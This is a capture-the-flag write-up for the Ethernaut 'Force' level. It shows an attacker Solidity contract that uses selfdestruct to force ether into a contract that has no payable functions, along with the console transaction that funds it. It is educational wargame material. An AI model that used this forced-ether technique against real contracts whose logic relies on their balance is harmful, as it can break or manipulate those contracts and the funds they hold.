# Force

Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

Fallback methods
Sometimes the best way to attack a contract is with another contract.
See the Help page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

This contract has no methods. There is nothing that will accept Ether. However, there is a way to always send ether, the selfDestruct method. 

Here is a good [link](https://solidity-by-example.org/hacks/self-destruct/)

In order to exploit this contract I set up another contract with a selfDestruct call that sends ether to the contract. 

```solidity
contract Attack {
    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(0xD0e9B6f6b1A2C8526069DB4fdB3F7397D73D42c6);
        selfdestruct(addr);
    }
    
    fallback() external payable {}
}
```

In order to send ether to my contract I ran the following in the console.

```js
await sendTransaction({
from: '0x7cd9b6A2c517e1930F230d032Ab25F497A87c651',
to: '0x28EB7Bf2A436c4938755921Eba993089AF7c439A',
value: toWei(".001")
})
```

After sending the ether over. I executed the attack function by clicking the button on the remix IDE site.

This executed the selfDestruct and sent ether to the contract. In the attack contract the address in the payable parens is the address of the contract I was attacking. 